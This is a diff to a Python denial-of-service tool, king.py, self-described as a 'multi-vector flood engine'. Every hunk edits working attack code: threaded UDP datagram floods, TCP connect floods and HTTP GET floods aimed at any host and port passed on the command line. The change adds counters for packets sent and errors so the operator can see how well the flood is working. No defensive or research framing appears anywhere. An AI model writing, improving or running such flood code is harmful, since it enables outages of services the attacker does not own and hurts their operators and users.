@@ -2,18 +2,12 @@
 """
 king.py — multi-vector flood engine (UDP, TCP, HTTP).
 
-Signature:
-    attack(target, port, duration, threads=100, payload_size=1024, vector="udp") -> int
+Every attack function returns a dict:
+    {"workers": int, "sent": int, "errors": int, "last_error": str}
 
 Targets accept:
     '1.2.3.4', '1.2.3.4:443', 'host.com', 'host.com:443'
-
 IPv6 rejected with ValueError.
-
-Vectors:
-    udp  — raw datagram flood
-    tcp  — connect flood
-    http — GET flood over TCP (target must speak HTTP)
 """
 
 import socket
@@ -29,7 +23,6 @@ VECTORS = ("udp", "tcp", "http")
 # ── target normalization ──────────────────────────────────────────────────
 
 def _resolve(target):
-    """Return IPv4 dotted-quad string. Raises ValueError / gaierror."""
     if not isinstance(target, str) or not target.strip():
         raise ValueError(f"empty target: {target!r}")
 
@@ -60,8 +53,6 @@ def _resolve(target):
     return socket.gethostbyname(t)
 
 
-# ── common validation ─────────────────────────────────────────────────────
-
 def _validate(target, port, duration, threads):
     try:
         port = int(port)
@@ -90,17 +81,20 @@ def _validate(target, port, duration, threads):
 
 # ── UDP ───────────────────────────────────────────────────────────────────
 
-def _udp_worker(sock, ip, port, end_time, payload):
+def _udp_worker(sock, ip, port, end_time, payload, stats):
     while time.time() < end_time:
         try:
             sock.sendto(payload, (ip, port))
-        except OSError:
-            pass
+            stats["sent"] += 1
+        except OSError as e:
+            stats["errors"] += 1
+            stats["last_error"] = f"{type(e).__name__}: {e}"
 
 
 def attack_udp(ip, port, duration, threads, payload_size=1024):
     end_time = time.time() + duration
     payload = b"\x00" * payload_size
+    stats = {"sent": 0, "errors": 0, "last_error": ""}
 
     socks = []
     for _ in range(threads):
@@ -117,7 +111,7 @@ def attack_udp(ip, port, duration, threads, payload_size=1024):
     workers = []
     for s in socks:
         t = threading.Thread(target=_udp_worker,
-                             args=(s, ip, port, end_time, payload),
+                             args=(s, ip, port, end_time, payload, stats),
                              daemon=True)
         try:
             t.start()
@@ -141,12 +135,17 @@ def attack_udp(ip, port, duration, threads, payload_size=1024):
         except OSError:
             pass
 
-    return len(workers)
+    return {
+        "workers": len(workers),
+        "sent": stats["sent"],
+        "errors": stats["errors"],
+        "last_error": stats["last_error"],
+    }
 
 
 # ── TCP ───────────────────────────────────────────────────────────────────
 
-def _tcp_worker(ip, port, end_time, counter, lock):
+def _tcp_worker(ip, port, end_time, stats):
     while time.time() < end_time:
         try:
             c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -158,21 +157,20 @@ def _tcp_worker(ip, port, end_time, counter, lock):
             except OSError:
                 pass
             c.close()
-            with lock:
-                counter[0] += 1
-        except OSError:
-            pass
+            stats["sent"] += 1
+        except OSError as e:
+            stats["errors"] += 1
+            stats["last_error"] = f"{type(e).__name__}: {e}"
 
 
 def attack_tcp(ip, port, duration, threads):
     end_time = time.time() + duration
-    counter = [0]
-    lock = threading.Lock()
+    stats = {"sent": 0, "errors": 0, "last_error": ""}
 
     workers = []
     for _ in range(threads):
         t = threading.Thread(target=_tcp_worker,
-                             args=(ip, port, end_time, counter, lock),
+                             args=(ip, port, end_time, stats),
                              daemon=True)
         try:
             t.start()
@@ -185,12 +183,18 @@ def attack_tcp(ip, port, duration, threads):
 
     for t in workers:
         t.join()
-    return len(workers)
+
+    return {
+        "workers": len(workers),
+        "sent": stats["sent"],
+        "errors": stats["errors"],
+        "last_error": stats["last_error"],
+    }
 
 
 # ── HTTP ──────────────────────────────────────────────────────────────────
 
-def _http_worker(ip, port, end_time, req, counter, lock):
+def _http_worker(ip, port, end_time, req, stats):
     while time.time() < end_time:
         try:
             c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -202,10 +206,10 @@ def _http_worker(ip, port, end_time, req, counter, lock):
             except OSError:
                 pass
             c.close()
-            with lock:
-                counter[0] += 1
-        except OSError:
-            pass
+            stats["sent"] += 1
+        except OSError as e:
+            stats["errors"] += 1
+            stats["last_error"] = f"{type(e).__name__}: {e}"
 
 
 def attack_http(ip, port, duration, threads, path="/"):
@@ -214,13 +218,12 @@ def attack_http(ip, port, duration, threads, path="/"):
            f"Host: {ip}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Connection: keep-alive\r\n\r\n").encode()
-    counter = [0]
-    lock = threading.Lock()
+    stats = {"sent": 0, "errors": 0, "last_error": ""}
 
     workers = []
     for _ in range(threads):
         t = threading.Thread(target=_http_worker,
-                             args=(ip, port, end_time, req, counter, lock),
+                             args=(ip, port, end_time, req, stats),
                              daemon=True)
         try:
             t.start()
@@ -233,17 +236,18 @@ def attack_http(ip, port, duration, threads, path="/"):
 
     for t in workers:
         t.join()
-    return len(workers)
+
+    return {
+        "workers": len(workers),
+        "sent": stats["sent"],
+        "errors": stats["errors"],
+        "last_error": stats["last_error"],
+    }
 
 
 # ── dispatcher ────────────────────────────────────────────────────────────
 
 def attack(target, port, duration, threads=100, payload_size=1024, vector="udp"):
-    """
-    Unified flood. Blocks for `duration` seconds. Returns worker count.
-
-    vector ∈ ("udp", "tcp", "http")
-    """
     vector = (vector or "udp").lower()
     if vector not in VECTORS:
         raise ValueError(f"unknown vector {vector!r}; use one of {VECTORS}")
@@ -267,7 +271,6 @@ def attack(target, port, duration, threads=100, payload_size=1024, vector="udp")
 
 def start_attack(target, port, duration, threads=100,
                  payload_size=1024, vector="udp"):
-    """Non-blocking. Returns the Thread. Exceptions are NOT propagated."""
     t = threading.Thread(target=attack,
                          args=(target, port, duration, threads, payload_size, vector),
                          daemon=True)
@@ -284,11 +287,13 @@ def _main(argv):
     target, port, duration, threads = argv[1:5]
     vector = argv[5] if len(argv) == 6 else "udp"
     try:
-        n = attack(target, int(port), int(duration), int(threads), vector=vector)
+        r = attack(target, int(port), int(duration), int(threads), vector=vector)
     except (ValueError, RuntimeError, socket.gaierror) as e:
         print(f"Error: {e}", file=sys.stderr)
         return 2
-    print(f"dispatched {n} workers  vector={vector}")
+    print(f"workers={r['workers']}  sent={r['sent']}  errors={r['errors']}  vector={vector}")
+    if r["last_error"]:
+        print(f"last_error: {r['last_error']}", file=sys.stderr)
     return 0
 
 
